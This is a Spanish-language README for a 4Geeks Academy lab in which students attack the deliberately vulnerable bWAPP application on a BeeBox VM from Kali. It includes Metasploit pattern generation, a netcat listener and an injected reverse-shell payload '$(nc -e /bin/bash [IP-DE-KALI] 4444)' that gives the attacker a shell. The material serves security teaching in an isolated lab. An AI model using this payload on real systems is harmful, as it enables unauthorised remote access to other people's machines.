<!-- hide -->
#  Buffer overflow exploit

> By [@rosinni](https://github.com/rosinni) and [other contributors](https://github.com/breatheco-de/buffer-overflow-exploit-project/graphs/contributors) at [4Geeks Academy](https://4geeksacademy.co/)

[![build by developers](https://img.shields.io/badge/build_by-Developers-blue)](https://4geeks.com)
[![build by developers](https://img.shields.io/twitter/follow/4geeksacademy?style=social&logo=twitter)](https://twitter.com/4geeksacademy)

*Estas instrucciones estan [disponibles en español](https://github.com/breatheco-de/buffer-overflow-exploit-project/blob/main/README.es.md)*

### Antes de empezar...

> ¡Te necesitamos! Estos ejercicios se crean y mantienen en colaboración con personas como tú. Si encuentras algún error o falta de ortografía, contribuye y/o repórtalo.

<!-- endhide -->


<onlyfor saas="true" withBanner="true">

## 🌱 ¿Cómo empezar este proyecto?

Este ejercicio tiene como objetivo aprender a identificar y explotar vulnerabilidades de buffer overflow. A través de este proyecto entenderás cómo los desbordamientos de buffer pueden ser utilizados para ejecutar código arbitrario, así como a aplicar técnicas de explotación para comprometer la seguridad de la aplicación.

### Requisitos

* Máquina Kali (atacante) 
* Máquina Beebox

</onlyfor>

## 📝 Instrucciones

1. Verifica que tanto Kali Linux como BeeBox estén conectadas en la misma red. Puedes hacer esto comprobando las direcciones IP asignadas a cada máquina y asegurándote de que pueden comunicarse entre sí.

2. Verifica la conectividad. Desde Kali, intenta hacer ping a BeeBox y viceversa para confirmar que la conexión de red está funcionando.

    ```bash
    ping [IP-DE-BEEBOX]
    ping [IP-DE-KALI]
    ```
3. Inicia sesión en la máquina BeeBox.
4. Encuentra el hash relacionado con la vulnerabilidad (esto puede ser parte de la configuración o el código).

### Verificar la Vulnerabilidad de desbordamiento de búfer

1. Ingresa un nombre de película que esté en la base de datos de bWAPP (por ejemplo, Hulk, Iron Man).
2. Luego ingresa un nombre de película que no esté en la base de datos (por ejemplo, Harry Potter).

3. Ejecuta el siguiente comando para ver el contenido del archivo `bof_1.php`:

    ```bash
    cat /var/www/bWAPP/bof_1.php
    ```

   > El objetivo es entender cómo se maneja el input del título de la película y cómo se pasa como argumento de línea de comandos a la aplicación. Busca indicios de desbordamiento de búfer.

### Generar y usar la Cadena de Explotación
1. Generar la cadena de explotación ejecutando el siguiente comando en Kali para generar una cadena que te ayudará a identificar el desbordamiento de búfer:

```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 360
```


2. Guarda la cadena generada en un archivo llamado `pattern_chain.txt`:

```bash
    echo "Aa0Aa1Aa2Aa3Aa4Aa5..." > pattern_chain.txt
```

3. Inicia un servidor HTTP en Kali para transferir el archivo:

```bash
python3 -m http.server 8080
```

4. Descarga el archivo `pattern_chain.txt` en BeeBox usando `wget`:

```bash
wget http://[IP-DE-KALI]:8080/pattern_chain.txt
```

5. Lee el contenido del archivo descargado en BeeBox:
```bash
cat pattern_chain.txt
```

### Inyectar la cadena de explotación y el payload

1. Usa la cadena generada con `pattern_create.rb` en el campo o parámetro que pueda causar el desbordamiento de búfer en bWAPP.

![imagen 1](assets/bufferoverflow.png)

> El objetivo seria ver cómo responde la aplicación a una entrada que excede el tamaño esperado.

2. Ejecuta un listener en Kali para recibir la shell remota:
```bash
nc -lvnp 4444
```

3. Para obtener una shell remota, inyecta el siguiente payload en el campo que causa el desbordamiento:

```bash
    $(nc -e /bin/bash [IP-DE-KALI] 4444)
```

> Reemplaza `[IP-DE-KALI]` con la dirección IP de tu máquina Kali.

4. Confirmar la conexión en Kali. Si el exploit es exitoso, deberías ver una conexión en el listener de Kali y recibir un prompt de Bash.

### Verificar los Logs del Servidor

1. Revisa los logs del servidor web en BeeBox para cualquier mensaje relacionado con el desbordamiento de búfer:

```bash
sudo cat /var/log/apache2/error.log
```

![imagen 1](assets/segmentationfault.png)
